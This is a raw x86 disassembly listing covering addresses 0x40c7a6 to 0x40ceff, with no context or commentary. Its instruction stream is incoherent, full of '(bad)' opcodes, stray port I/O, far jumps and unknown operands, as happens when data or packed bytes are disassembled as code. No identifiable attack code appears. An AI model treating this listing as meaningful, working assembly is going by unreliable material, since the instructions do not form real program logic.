  40c7a6:	sbb    esi,DWORD PTR [edi]
  40c7a8:	ds test al,0x81
  40c7ab:	aaa    
  40c7ac:	fld    TBYTE PTR [eax+eax*1-0x7d]
  40c7b0:	xor    DWORD PTR [esi+0x4da7bfa6],edi
  40c7b6:	pop    eax
  40c7b7:	push   esp
  40c7b8:	adc    ah,BYTE PTR [edx-0x36]
  40c7bb:	cmp    BYTE PTR [ebx],bh
  40c7bd:	pop    ds
  40c7be:	cmc    
  40c7bf:	or     edi,ecx
  40c7c1:	test   eax,0xb95cbd5e
  40c7c6:	mov    esi,esi
  40c7c8:	inc    esi
  40c7c9:	pop    ebx
  40c7ca:	popf   
  40c7cb:	sbb    al,ah
  40c7cd:	pop    ebx
  40c7ce:	adc    eax,0xd3c16914
  40c7d3:	and    edx,DWORD PTR [edx+ecx*2]
  40c7d6:	es inc edi
  40c7d8:	cwde   
  40c7d9:	mov    edx,0xb2fd6eb4
  40c7de:	and    eax,0x8611bc6e
  40c7e3:	daa    
  40c7e4:	sbb    al,0x51
  40c7e6:	or     edi,DWORD PTR ds:0x33a1b22b
  40c7ec:	out    0x8c,al
  40c7ee:	leave  
  40c7ef:	dec    edi
  40c7f0:	jmp    0xc356:0x92152746
  40c7f7:	pushf  
  40c7f8:	mov    eax,ds:0x4be749d
  40c7fd:	loope  0x40c7a4
  40c7ff:	cmp    bl,ch
  40c801:	dec    edx
  40c802:	pop    eax
  40c803:	fwait
  40c804:	mul    DWORD PTR [ebp+0x78]
  40c807:	and    BYTE PTR [ebp+0x56],cl
  40c80a:	das    
  40c80b:	push   ss
  40c80c:	mov    cl,0xac
  40c80e:	in     eax,0x7d
  40c810:	pop    ecx
  40c811:	ja     0x40c7cf
  40c813:	fld    QWORD PTR [esi-0x4425f6ce]
  40c819:	cmp    DWORD PTR [ebp+ebx*8+0x6a],esp
  40c81d:	ss dec ebp
  40c81f:	add    dh,BYTE PTR [eax+0x79d9598e]
  40c825:	sbb    al,0x8e
  40c827:	scas   eax,DWORD PTR es:[edi]
  40c828:	mov    es,WORD PTR ds:0x6ca6e8e6
  40c82e:	dec    eax
  40c82f:	add    eax,0x83dc46fa
  40c834:	adc    al,0x3e
  40c836:	test   BYTE PTR [eax-0x353140df],al
  40c83c:	es push ebx
  40c83e:	(bad)  
  40c83f:	sub    al,0x69
  40c841:	adc    cl,0xfe
  40c844:	hlt    
  40c845:	call   0xc248:0xa4869165
  40c84c:	jnp    0x40c8c4
  40c84e:	mov    ah,0xe6
  40c850:	pushf  
  40c851:	fild   DWORD PTR [eax+ecx*8+0x6e2d56cd]
  40c858:	popa   
  40c859:	shl    BYTE PTR [esi-0x4f858c0a],1
  40c85f:	arpl   bx,dx
  40c861:	pop    edx
  40c862:	and    esi,DWORD PTR [esi]
  40c864:	xor    ch,0x45
  40c867:	jl     0x40c812
  40c869:	push   es
  40c86a:	and    bh,ah
  40c86c:	push   0x54
  40c86e:	mov    al,ah
  40c870:	cmc    
  40c871:	mov    edx,0x3dce646a
  40c876:	and    al,0x4f
  40c878:	ret    
  40c879:	xor    ah,BYTE PTR [eax+0x74]
  40c87c:	loopne 0x40c8c9
  40c87e:	aad    0x37
  40c880:	(bad)  
  40c881:	or     al,0xf8
  40c883:	mov    dh,0x5d
  40c885:	adc    eax,0xc47b7706
  40c88a:	sub    al,0xba
  40c88c:	cmc    
  40c88d:	loop   0x40c871
  40c88f:	cmp    al,0x40
  40c891:	jecxz  0x40c8ce
  40c893:	mov    fs,WORD PTR [edx]
  40c895:	jmp    0x40c838
  40c897:	inc    eax
  40c898:	not    BYTE PTR [ebp+0x59789a15]
  40c89e:	mov    ah,0xf0
  40c8a0:	clc    
  40c8a1:	out    dx,al
  40c8a2:	jmp    0x40c88d
  40c8a4:	and    bl,BYTE PTR [edx-0x1e0b451a]
  40c8aa:	jle    0x40c924
  40c8ac:	and    bl,BYTE PTR [ecx]
  40c8ae:	push   es
  40c8af:	stos   BYTE PTR es:[edi],al
  40c8b0:	mov    ch,0x58
  40c8b2:	dec    ecx
  40c8b3:	or     DWORD PTR [ebp-0x1e970953],eax
  40c8b9:	cmp    BYTE PTR [eax+esi*8+0x26],0x49
  40c8be:	in     al,dx
  40c8bf:	sahf   
  40c8c0:	bound  eax,QWORD PTR [esi+0x66379542]
  40c8c6:	(bad)  
  40c8c7:	(bad)  
  40c8c8:	xchg   esi,eax
  40c8c9:	xlat   BYTE PTR ds:[ebx]
  40c8ca:	neg    ebx
  40c8cc:	xchg   esi,eax
  40c8cd:	jecxz  0x40c881
  40c8cf:	pop    ecx
  40c8d0:	stos   BYTE PTR es:[edi],al
  40c8d1:	in     eax,0xc4
  40c8d3:	or     BYTE PTR [edi],bh
  40c8d5:	retf   
  40c8d6:	jecxz  0x40c85b
  40c8d8:	int    0x3
  40c8da:	and    eax,0x2a8f74f
  40c8df:	hlt    
  40c8e0:	cdq    
  40c8e1:	daa    
  40c8e2:	retf   
  40c8e3:	mov    ch,0xc1
  40c8e5:	push   ebx
  40c8e6:	hlt    
  40c8e7:	push   edx
  40c8e8:	outs   dx,DWORD PTR ds:[esi]
  40c8e9:	fcmovnu st,st(1)
  40c8eb:	dec    edx
  40c8ec:	or     ebp,esi
  40c8ee:	test   bh,bh
  40c8f0:	or     DWORD PTR ds:0x32943dfe,0x24
  40c8f7:	push   0x6f
  40c8f9:	arpl   WORD PTR [edi],ax
  40c8fb:	and    BYTE PTR [esi],dh
  40c8fd:	jl     0x40c8ca
  40c8ff:	or     ebp,DWORD PTR [esi]
  40c901:	mov    bl,0x67
  40c903:	test   edi,0x1c5b480f
  40c909:	test   eax,0x8924d180
  40c90e:	cs clc 
  40c910:	mov    dl,0xc2
  40c912:	jo     0x40c89b
  40c914:	lea    ebx,[esi+ecx*1+0x1]
  40c918:	dec    edi
  40c919:	xchg   ebp,eax
  40c91a:	mov    edi,0x9eb0c658
  40c91f:	adc    edx,DWORD PTR [edi+eiz*8-0x42]
  40c923:	xor    BYTE PTR [eax],bh
  40c925:	mov    ebx,0xdfdde975
  40c92a:	mov    eax,0xa62c6b31
  40c92f:	xor    al,0xe4
  40c931:	push   es
  40c932:	xchg   edx,eax
  40c933:	push   es
  40c934:	cmp    ch,BYTE PTR [ecx]
  40c936:	pop    eax
  40c937:	adc    edx,ebp
  40c939:	mov    ?,WORD PTR [esi+0x75]
  40c93c:	lods   al,BYTE PTR ds:[esi]
  40c93d:	fs sbb al,0x22
  40c940:	stc    
  40c941:	fsub   QWORD PTR [edx-0x6e]
  40c944:	div    BYTE PTR [esi+ebp*2+0x2b23ee7]
  40c94b:	pop    edx
  40c94c:	jge    0x40c915
  40c94e:	cmp    al,0x73
  40c950:	lds    eax,FWORD PTR [edx+0x55]
  40c953:	int    0x6
  40c955:	aam    0xf6
  40c957:	pop    edi
  40c958:	jecxz  0x40c9c7
  40c95a:	cs retf 0xd598
  40c95e:	repz adc al,0xda
  40c961:	or     esp,DWORD PTR [ecx+0x47]
  40c964:	es retf 0x9dfe
  40c968:	mov    ecx,0x7195455c
  40c96d:	in     eax,dx
  40c96e:	adc    ch,BYTE PTR [eax+edi*4-0x12]
  40c972:	lds    ebx,FWORD PTR [eax]
  40c974:	add    edx,esi
  40c976:	adc    ebx,DWORD PTR [edx+0x5c077d37]
  40c97c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c97d:	stos   DWORD PTR es:[edi],eax
  40c97e:	mov    ecx,0xd0f4aacb
  40c983:	xor    al,0x38
  40c985:	mov    ch,0xf9
  40c987:	(bad)
  40c98b:	xor    al,0x5c
  40c98d:	add    eax,0x80279143
  40c992:	push   ss
  40c993:	jmp    0x40c94e
  40c995:	push   ss
  40c996:	push   eax
  40c997:	(bad)  
  40c998:	out    0xbf,al
  40c99a:	pop    ss
  40c99b:	sahf   
  40c99c:	cwde   
  40c99d:	xor    BYTE PTR [eax+0x7a65876a],dl
  40c9a3:	push   ebx
  40c9a4:	mov    DWORD PTR [ebp+0x2f],ecx
  40c9a7:	ficom  DWORD PTR [esi]
  40c9a9:	enter  0x1e03,0x63
  40c9ad:	pop    esp
  40c9ae:	lea    edi,[ecx-0x74]
  40c9b1:	sbb    DWORD PTR [edi+edi*8],esi
  40c9b4:	dec    edx
  40c9b5:	js     0x40c940
  40c9b7:	out    dx,eax
  40c9b8:	sar    DWORD PTR ds:0xc73b1a93,0x8
  40c9bf:	or     eax,ebx
  40c9c1:	(bad)  
  40c9c2:	ret    
  40c9c3:	sti    
  40c9c4:	cmp    dh,BYTE PTR [edi-0x6c3f5ce]
  40c9ca:	mov    bl,0x1d
  40c9cc:	push   edx
  40c9cd:	xor    eax,esp
  40c9cf:	pop    edx
  40c9d0:	dec    edi
  40c9d1:	push   0xdc29ef8
  40c9d6:	xchg   ebx,eax
  40c9d7:	sar    DWORD PTR [ecx+0x50b649d4],0xeb
  40c9de:	fmul   QWORD PTR [eax-0x56]
  40c9e1:	fld    DWORD PTR [ebx+ebx*8-0xb49e322]
  40c9e8:	test   BYTE PTR [edx-0x7dcee8ab],0x5
  40c9ef:	push   esi
  40c9f0:	jmp    0x40c9dd
  40c9f2:	mov    eax,0xc6dab9a0
  40c9f7:	push   edx
  40c9f8:	push   ebp
  40c9f9:	adc    BYTE PTR [esi-0x72d77326],0xde
  40ca00:	cmp    ebx,DWORD PTR [eax-0x6d]
  40ca03:	cmp    eax,DWORD PTR [esi]
  40ca05:	das    
  40ca06:	sar    eax,cl
  40ca08:	mov    ebp,0x1650931b
  40ca0d:	jns    0x40ca45
  40ca0f:	push   ss
  40ca10:	sahf   
  40ca11:	pop    edx
  40ca12:	add    al,0x64
  40ca14:	sbb    al,0xdc
  40ca16:	xlat   BYTE PTR ds:[ebx]
  40ca17:	dec    ecx
  40ca18:	inc    edx
  40ca19:	fucomi st,st(5)
  40ca1b:	dec    BYTE PTR [ebx-0x2f145a1f]
  40ca21:	adc    al,BYTE PTR [ebx+0x434a98cc]
  40ca27:	inc    eax
  40ca28:	sbb    DWORD PTR ds:0x643750f6,esi
  40ca2e:	mov    ds:0x406377f4,al
  40ca33:	push   esi
  40ca34:	in     al,dx
  40ca35:	into   
  40ca36:	sub    esi,DWORD PTR [edi+0x17]
  40ca39:	int    0x74
  40ca3b:	push   cs
  40ca3c:	(bad)  
  40ca3d:	cmp    BYTE PTR [ecx],cl
  40ca3f:	mov    dl,0xae
  40ca41:	xchg   edi,eax
  40ca42:	push   cs
  40ca43:	xchg   edi,eax
  40ca44:	jns    0x40ca2d
  40ca46:	scas   al,BYTE PTR es:[edi]
  40ca47:	or     eax,0xc0fa36a1
  40ca4c:	popf   
  40ca4d:	xor    al,0xa3
  40ca4f:	stc    
  40ca50:	lock push ebx
  40ca52:	push   ebx
  40ca53:	lds    edx,FWORD PTR [ebp-0x59]
  40ca56:	and    eax,DWORD PTR [edi]
  40ca58:	pushf  
  40ca59:	inc    edi
  40ca5a:	mov    ebp,0xe87f1d86
  40ca5f:	add    ebx,DWORD PTR ds:0x8c5ef6d6
  40ca65:	int    0xc8
  40ca67:	inc    edx
  40ca68:	imul   eax,DWORD PTR [ebx-0x5035480c],0x68
  40ca6f:	rol    BYTE PTR [edi],cl
  40ca71:	jmp    0x40ca7b
  40ca73:	ror    BYTE PTR [ecx+0x5ae0e94e],cl
  40ca79:	pop    si
  40ca7b:	sahf   
  40ca7c:	push   es
  40ca7d:	mov    eax,ds:0x8ef2331f
  40ca82:	nop
  40ca83:	and    DWORD PTR [esp+eiz*2],0xffffffc3
  40ca87:	jbe    0x40ca93
  40ca89:	pop    esi
  40ca8a:	in     al,dx
  40ca8b:	fistp  DWORD PTR [ebx+0x16]
  40ca8e:	(bad)  
  40ca8f:	scas   eax,DWORD PTR es:[edi]
  40ca90:	fisttp WORD PTR ss:[esi]
  40ca93:	jecxz  0x40ca9b
  40ca95:	int    0xed
  40ca97:	lods   eax,DWORD PTR ds:[esi]
  40ca98:	or     eax,0x8114a283
  40ca9d:	xchg   edx,eax
  40ca9e:	mov    eax,ds:0xfc7fd72
  40caa3:	xor    esp,ecx
  40caa5:	cmp    ecx,DWORD PTR [edi+0x7dd02f93]
  40caab:	and    esi,DWORD PTR [eax+0x0]
  40caae:	neg    BYTE PTR [esi]
  40cab0:	ja     0x40caf0
  40cab2:	int    0x5d
  40cab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab5:	xchg   edx,eax
  40cab6:	sahf   
  40cab7:	pop    edx
  40cab8:	pop    ebp
  40cab9:	adc    edi,DWORD PTR [ebx]
  40cabb:	mov    dh,0xfc
  40cabd:	retf   
  40cabe:	add    ch,BYTE PTR [esi-0x4b]
  40cac1:	shl    DWORD PTR ss:[esi+0x16],0xac
  40cac6:	mov    dh,0x60
  40cac8:	mov    ecx,0x546ced83
  40cacd:	test   eax,0xc90c31b8
  40cad2:	and    eax,0x25e1ae06
  40cad7:	lea    edx,[ebx-0x746e1c41]
  40cadd:	(bad)  
  40cade:	mov    WORD PTR [ebp-0x6846b5d1],?
  40cae4:	(bad)  
  40cae5:	je     0x40ca94
  40cae7:	repnz and bl,BYTE PTR [edx+0x6d]
  40caeb:	pop    ebx
  40caec:	jg     0x40cac3
  40caee:	xchg   ebp,eax
  40caef:	test   BYTE PTR ds:0x650b8721,ah
  40caf5:	test   al,0x88
  40caf7:	fwait
  40caf8:	xor    al,0xce
  40cafa:	out    dx,eax
  40cafb:	ja     0x40cade
  40cafd:	out    dx,al
  40cafe:	cmp    DWORD PTR [edi],edx
  40cb00:	pushf  
  40cb01:	fcomp  DWORD PTR ds:0xf6af8096
  40cb07:	adc    DWORD PTR [ebx-0x191e3ef3],ebx
  40cb0d:	ficom  WORD PTR [esi]
  40cb0f:	addr16 nop
  40cb11:	xor    dl,BYTE PTR [eax+eiz*4]
  40cb14:	jno    0x40cb5e
  40cb16:	std    
  40cb17:	retf   0xe2c0
  40cb1a:	(bad)  
  40cb1b:	mov    ?,WORD PTR [esi-0x255d45a2]
  40cb21:	push   ecx
  40cb22:	mov    bh,cl
  40cb24:	inc    esp
  40cb25:	fcom   QWORD PTR [ecx+0x1a]
  40cb28:	outs   dx,BYTE PTR ds:[esi]
  40cb29:	mov    dh,0xb0
  40cb2b:	inc    esi
  40cb2c:	js     0x40cab6
  40cb2e:	and    edx,DWORD PTR [edx]
  40cb30:	xchg   esp,eax
  40cb31:	inc    edx
  40cb32:	xchg   edx,eax
  40cb33:	or     al,0x7f
  40cb35:	int3   
  40cb36:	jle    0x40cbaf
  40cb38:	test   BYTE PTR [edi-0x2974aba],dh
  40cb3e:	icebp  
  40cb3f:	jg     0x40cafe
  40cb41:	cmp    al,0x76
  40cb43:	test   DWORD PTR [ecx],0xb9e772b9
  40cb49:	sbb    BYTE PTR [edx],bl
  40cb4b:	and    al,0xdb
  40cb4d:	outs   dx,BYTE PTR ds:[esi]
  40cb4e:	(bad)  
  40cb4f:	ins    BYTE PTR es:[edi],dx
  40cb50:	mov    ecx,0xe0eee60d
  40cb55:	push   cs
  40cb56:	fs retf 0x3d32
  40cb5a:	pop    eax
  40cb5b:	retf   0x18a1
  40cb5e:	jmp    0x93e6:0xf505ef58
  40cb65:	fwait
  40cb66:	inc    eax
  40cb67:	pop    edi
  40cb68:	adc    eax,0x2f30854b
  40cb6d:	add    bh,bl
  40cb6f:	xor    al,0x50
  40cb71:	arpl   WORD PTR [esi],bx
  40cb73:	push   ebx
  40cb74:	data16 sub BYTE PTR [edx-0x3d],0x31
  40cb79:	lock mov ah,0x2a
  40cb7c:	stos   DWORD PTR es:[edi],eax
  40cb7d:	imul   esi,esp,0xffffffa5
  40cb80:	popa   
  40cb81:	ret    
  40cb82:	sbb    esi,DWORD PTR [esp+eiz*8]
  40cb85:	adc    BYTE PTR [ebx],bh
  40cb87:	std    
  40cb88:	mov    ah,0xce
  40cb8a:	retf   
  40cb8b:	adc    al,bl
  40cb8d:	xor    DWORD PTR [ecx],edx
  40cb8f:	jne    0x40cb6a
  40cb91:	push   es
  40cb92:	jnp    0x40cba0
  40cb94:	fs stos BYTE PTR es:[edi],al
  40cb96:	add    al,0x87
  40cb98:	mov    bl,0xc5
  40cb9a:	addr16 test edx,ebp
  40cb9d:	add    esi,ebx
  40cb9f:	jbe    0x40cb4e
  40cba1:	popf   
  40cba2:	pop    edx
  40cba3:	dec    ecx
  40cba4:	inc    esi
  40cba5:	sub    dl,BYTE PTR [esi]
  40cba7:	icebp  
  40cba8:	pop    edi
  40cba9:	jge    0x40cbbe
  40cbab:	add    DWORD PTR [edx+0x7e],ebx
  40cbae:	in     al,0x49
  40cbb0:	or     BYTE PTR [ecx],dh
  40cbb2:	fisttp WORD PTR [eax-0x2dfa7e71]
  40cbb8:	inc    eax
  40cbb9:	fbstp  TBYTE PTR [ecx+0xe654789]
  40cbbf:	ret    
  40cbc0:	iret   
  40cbc1:	std    
  40cbc2:	in     eax,0x3
  40cbc4:	scas   eax,DWORD PTR es:[edi]
  40cbc5:	add    BYTE PTR [edx+0x13b4f60b],cl
  40cbcb:	mov    edi,0xd13bd184
  40cbd0:	cdq    
  40cbd1:	mov    bl,0x2f
  40cbd3:	or     bh,dl
  40cbd5:	adc    ah,al
  40cbd7:	neg    DWORD PTR [edi]
  40cbd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbda:	shl    dh,cl
  40cbdc:	push   esp
  40cbdd:	in     al,dx
  40cbde:	je     0x40cb98
  40cbe0:	test   al,0x42
  40cbe2:	or     dh,BYTE PTR [eax-0x13d77447]
  40cbe8:	push   0xb2bb286
  40cbed:	pop    ds
  40cbee:	in     al,dx
  40cbef:	popf   
  40cbf0:	adc    eax,0x76d9553c
  40cbf5:	cmp    dl,BYTE PTR [edx]
  40cbf7:	setno  BYTE PTR [edi]
  40cbfa:	cmp    al,0x20
  40cbfc:	mov    ch,dh
  40cbfe:	fnstenv [ebx+0x60]
  40cc01:	jnp    0x40cc29
  40cc03:	adc    DWORD PTR [edx-0x3954afd],ebx
  40cc09:	test   al,0xc0
  40cc0b:	mov    ds:0x9e5e777a,eax
  40cc10:	jo     0x40cc85
  40cc12:	mov    WORD PTR [eax],?
  40cc14:	imul   edi,DWORD PTR [edi+eax*8+0x353eb06e],0xffffffbe
  40cc1c:	loope  0x40cbaf
  40cc1e:	dec    eax
  40cc1f:	or     ebx,DWORD PTR [ecx-0x3b]
  40cc22:	lods   al,BYTE PTR ds:[esi]
  40cc23:	popf   
  40cc24:	push   ebp
  40cc25:	lods   al,BYTE PTR ds:[esi]
  40cc26:	pop    ds
  40cc27:	xor    dl,BYTE PTR [ebx+ecx*4]
  40cc2a:	call   0xb810:0x1da9276e
  40cc31:	in     al,0xd7
  40cc33:	sbb    DWORD PTR [edx+0x74575b0e],esi
  40cc39:	mov    DWORD PTR [eax-0x57abd886],edi
  40cc3f:	cmp    al,bl
  40cc41:	mov    esp,0x270d4abe
  40cc46:	dec    ebx
  40cc47:	inc    esi
  40cc48:	test   DWORD PTR [edi+edi*1+0x11],ebp
  40cc4c:	popa   
  40cc4d:	dec    ebp
  40cc4e:	mov    DWORD PTR [esi],0x531c75e1
  40cc54:	stos   DWORD PTR es:[edi],eax
  40cc55:	jno    0x40cca2
  40cc57:	leave  
  40cc58:	std    
  40cc59:	and    eax,0xce101ccd
  40cc5e:	dec    esi
  40cc5f:	push   esi
  40cc60:	adc    cl,BYTE PTR [eax]
  40cc62:	push   0xc6476fb7
  40cc67:	retf   
  40cc68:	mov    al,0x48
  40cc6a:	popa   
  40cc6b:	adc    dl,BYTE PTR [ebp-0x3d]
  40cc6e:	cdq    
  40cc6f:	outs   dx,DWORD PTR ds:[esi]
  40cc70:	cmp    al,0x6d
  40cc72:	mov    ds:0x60068682,eax
  40cc77:	sti    
  40cc78:	inc    eax
  40cc7a:	pop    esi
  40cc7b:	mov    cl,0x9e
  40cc7d:	mov    WORD PTR [edx+0x784d6271],es
  40cc83:	fistp  QWORD PTR [eax]
  40cc85:	loop   0x40ccda
  40cc87:	xchg   ecx,eax
  40cc88:	jl     0x40cc50
  40cc8a:	mov    WORD PTR [eax],ss
  40cc8c:	push   0xa695221a
  40cc91:	arpl   WORD PTR [eax-0x3c7bf738],cx
  40cc97:	lea    ebx,[eax+0x3e1b2448]
  40cc9d:	inc    edi
  40cc9e:	jmp    0x9409:0xadb89ab7
  40cca5:	in     eax,0x2e
  40cca7:	rcr    BYTE PTR [esi+0x6e],1
  40ccaa:	adc    BYTE PTR [eax],bl
  40ccac:	mov    esp,0x695e84e9
  40ccb1:	rcr    DWORD PTR [edi+0x7a948eaa],0x32
  40ccb8:	jmp    0x43ef:0x4af1b0e1
  40ccbf:	jp     0x40cca7
  40ccc1:	cld    
  40ccc2:	adc    DWORD PTR [ebp+0x28],esi
  40ccc5:	aam    0x5c
  40ccc7:	pop    eax
  40ccc8:	popa   
  40ccc9:	mov    cl,0xe7
  40cccb:	mov    al,0x66
  40cccd:	mov    eax,0x576cdb81
  40ccd2:	adc    edi,DWORD PTR [ebp+0xad45df3]
  40ccd8:	(bad)  
  40ccd9:	pop    ecx
  40ccda:	ins    DWORD PTR es:[edi],dx
  40ccdb:	sahf   
  40ccdc:	sahf   
  40ccdd:	inc    eax
  40ccde:	add    ebx,eax
  40cce0:	imul   eax,DWORD PTR [ecx-0x4d4c3568],0xccd19202
  40ccea:	sar    cl,0x64
  40cced:	lea    ebp,[ebp-0x420bf948]
  40ccf3:	xchg   esi,eax
  40ccf4:	mov    eax,ds:0x2b3c544f
  40ccf9:	ds je  0x40ccc0
  40ccfc:	stc    
  40ccfd:	adc    DWORD PTR [eax+0x5f],0x5ce93100
  40cd04:	adc    DWORD PTR [ebx+0xa],0xffffffbb
  40cd08:	ret    0xa6a3
  40cd0b:	aaa    
  40cd0c:	push   esi
  40cd0d:	jne    0x40cccf
  40cd0f:	out    dx,eax
  40cd10:	push   0x6b
  40cd12:	aas    
  40cd13:	scas   al,BYTE PTR es:[edi]
  40cd14:	jecxz  0x40cd08
  40cd16:	es dec ebx
  40cd18:	(bad)  [edi-0x6aa33972]
  40cd1e:	outs   dx,BYTE PTR cs:[esi]
  40cd20:	adc    ebx,DWORD PTR [eax-0x5cb74e6b]
  40cd26:	add    DWORD PTR [ebx-0x62fc297e],0x54
  40cd2d:	adc    al,0x1d
  40cd2f:	cdq    
  40cd30:	dec    eax
  40cd31:	aaa    
  40cd32:	popa   
  40cd33:	mov    cl,0x88
  40cd35:	sahf   
  40cd36:	mov    ebp,0xa61127b1
  40cd3b:	daa    
  40cd3c:	imul   ebx,DWORD PTR [edi-0x5a40ba2a],0xffffffef
  40cd43:	retf   
  40cd44:	jno    0x40cd0c
  40cd46:	mov    al,ds:0xd35e6f40
  40cd4b:	pop    edi
  40cd4c:	aad    0x44
  40cd4e:	xchg   edx,eax
  40cd4f:	(bad)  
  40cd51:	cmc    
  40cd52:	xchg   ebp,eax
  40cd53:	push   eax
  40cd54:	sbb    eax,0x2120bd5d
  40cd59:	xor    ecx,ebx
  40cd5b:	popf   
  40cd5c:	xor    DWORD PTR [edx+0x6a169c64],edi
  40cd62:	pop    edi
  40cd63:	xchg   ebx,ebp
  40cd65:	es mov ecx,0x2aebdfc7
  40cd6b:	cli    
  40cd6c:	jmp    FWORD PTR [esi]
  40cd6e:	dec    esi
  40cd6f:	out    dx,eax
  40cd70:	jmp    0x40cd36
  40cd72:	mov    dl,0x72
  40cd74:	(bad)  
  40cd75:	sti    
  40cd76:	(bad)  
  40cd77:	cmp    ebx,esi
  40cd79:	or     ecx,DWORD PTR [edx]
  40cd7b:	js     0x40cd10
  40cd7d:	jo     0x40cdab
  40cd7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd80:	or     al,BYTE PTR [ecx-0x666de25d]
  40cd86:	fcmovnu st,st(7)
  40cd88:	inc    ebp
  40cd89:	sahf   
  40cd8a:	sbb    al,BYTE PTR [ebp+0x8]
  40cd8d:	fidiv  DWORD PTR [eax]
  40cd8f:	mov    al,0xa4
  40cd91:	inc    esp
  40cd92:	pop    edi
  40cd93:	adc    BYTE PTR [ebp+0x3cb1cd91],dh
  40cd99:	xor    al,0x1c
  40cd9b:	ja     0x40cdcf
  40cd9d:	dec    eax
  40cd9e:	sahf   
  40cd9f:	jo     0x40cd95
  40cda1:	cmp    esp,DWORD PTR gs:[ebp-0x78]
  40cda5:	sub    ah,ch
  40cda7:	and    bh,BYTE PTR [ecx+0x537ac914]
  40cdad:	xchg   ecx,eax
  40cdae:	push   esp
  40cdaf:	in     eax,0xe9
  40cdb1:	(bad)  
  40cdb2:	xor    BYTE PTR [edi],ah
  40cdb4:	xlat   BYTE PTR ds:[ebx]
  40cdb5:	inc    edx
  40cdb6:	nop
  40cdb7:	push   ds
  40cdb8:	sub    BYTE PTR [edx],dh
  40cdba:	aam    0x61
  40cdbc:	xchg   esp,eax
  40cdbd:	jmp    0x852085c8
  40cdc2:	cmp    edi,DWORD PTR [eax+0x5ffecd75]
  40cdc8:	aaa    
  40cdc9:	bound  edx,QWORD PTR [eax-0xf]
  40cdcc:	shr    BYTE PTR [ebp+0x37],cl
  40cdcf:	stc    
  40cdd0:	(bad)  
  40cdd1:	icebp  
  40cdd2:	jb     0x40ce42
  40cdd4:	and    ch,BYTE PTR [ebp-0x9]
  40cdd7:	sub    DWORD PTR [edi+0x7b],ebx
  40cdda:	loope  0x40cdef
  40cddc:	xchg   ebp,eax
  40cddd:	pop    esp
  40cdde:	xor    BYTE PTR [ecx],al
  40cde0:	and    DWORD PTR [edx*4+0x2fdc2cde],0x71
  40cde8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cde9:	std    
  40cdea:	int    0x7f
  40cdec:	xchg   bl,al
  40cdee:	and    eax,0xbedea810
  40cdf3:	xchg   esi,eax
  40cdf4:	sub    dh,BYTE PTR [edi]
  40cdf6:	retf   0x627
  40cdf9:	pop    esi
  40cdfa:	mov    bh,0x38
  40cdfc:	cmp    esi,edi
  40cdfe:	aas    
  40cdff:	imul   esi,eax,0xffffffe2
  40ce02:	mov    esp,0x47303a61
  40ce07:	shl    BYTE PTR [edi],0x3b
  40ce0a:	jmp    0x76ba:0x7215de9f
  40ce11:	lods   eax,DWORD PTR ds:[esi]
  40ce12:	sbb    bh,BYTE PTR [ebp+0x27]
  40ce15:	jb     0x40ce65
  40ce17:	cmp    esp,DWORD PTR [edx+ebx*2-0x973a58b]
  40ce1e:	mov    eax,ds:0xcfe001b1
  40ce23:	(bad)  
  40ce24:	pop    ds
  40ce25:	mov    fs,WORD PTR ds:0x8913d79c
  40ce2b:	ror    BYTE PTR [ecx+0x143a8416],1
  40ce31:	fwait
  40ce32:	adc    DWORD PTR [eax+eax*2+0x70a3fb11],ebx
  40ce39:	add    dh,BYTE PTR [ecx+ebp*2]
  40ce3c:	imul   esi,DWORD PTR [esi-0x28],0xffffffbb
  40ce40:	aas    
  40ce41:	fld    QWORD PTR [edi]
  40ce43:	cmp    edi,DWORD PTR [ebx-0x11]
  40ce46:	or     eax,0xf1591805
  40ce4b:	or     ebx,DWORD PTR [edi]
  40ce4d:	lahf   
  40ce4e:	pusha  
  40ce4f:	xor    eax,0x856ac500
  40ce54:	add    dh,0x93
  40ce57:	cld    
  40ce58:	sbb    DWORD PTR ds:0x63194297,ecx
  40ce5e:	shl    DWORD PTR [edi],1
  40ce60:	add    dl,BYTE PTR [ecx+ecx*8]
  40ce63:	and    DWORD PTR [ecx-0x5080aee1],ebp
  40ce69:	test   al,0xea
  40ce6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce6c:	sahf   
  40ce6d:	or     bh,BYTE PTR [ebp-0x116e6c23]
  40ce73:	xlat   BYTE PTR ds:[ebx]
  40ce74:	stos   BYTE PTR es:[edi],al
  40ce75:	(bad)  
  40ce77:	or     ch,BYTE PTR [edx]
  40ce79:	cmp    DWORD PTR [edx-0x2732e821],ebp
  40ce7f:	mov    bl,0x6a
  40ce81:	je     0x40ce59
  40ce83:	pushf  
  40ce84:	mov    dh,al
  40ce86:	call   0x7133:0xb38feabd
  40ce8d:	push   edx
  40ce8e:	mov    ebp,0xd7ce1e81
  40ce93:	out    0x14,al
  40ce95:	xchg   ebx,eax
  40ce96:	lock or eax,0x93aa7466
  40ce9c:	fild   WORD PTR [esi+eiz*8+0x73af6c83]
  40cea3:	push   edx
  40cea4:	xchg   esi,eax
  40cea5:	inc    ebx
  40cea6:	sar    DWORD PTR [esi-0x31],0x9a
  40ceaa:	lock pop ecx
  40ceac:	cdq    
  40cead:	cmp    ecx,edi
  40ceaf:	mov    dl,0x43
  40ceb1:	pushf  
  40ceb2:	rcl    BYTE PTR [ebp+0x866810b],1
  40ceb8:	xchg   ecx,eax
  40ceb9:	test   eax,0xe8be50e9
  40cebe:	call   0xda08955d
  40cec3:	sub    eax,0xf075231b
  40cec8:	cmp    DWORD PTR [ebp+0x16],esi
  40cecb:	mov    ds,WORD PTR [edx+0xdf93a70]
  40ced1:	pop    ds
  40ced2:	jge    0x40ce71
  40ced4:	mov    cl,0xc
  40ced6:	jnp    0x40cec0
  40ced8:	adc    DWORD PTR [edi-0x6d],edx
  40cedb:	push   esp
  40cedc:	sub    esi,DWORD PTR [ebx-0x1d7f81f6]
  40cee2:	inc    ecx
  40cee3:	test   BYTE PTR [esi],ch
  40cee5:	sub    al,0xb8
  40cee7:	(bad)  
  40cee8:	jmp    0x40cefe
  40ceea:	imul   edi,DWORD PTR [ecx+0x7c],0x435c3ab4
  40cef1:	sub    bh,bl
  40cef3:	cmc    
  40cef4:	adc    cl,BYTE PTR [ebx]
  40cef6:	push   ebp
  40cef7:	mov    eax,ds:0x3084b43f
  40cefc:	fdiv   st(5),st
  40cefe:	aas    
  40ceff:	nop
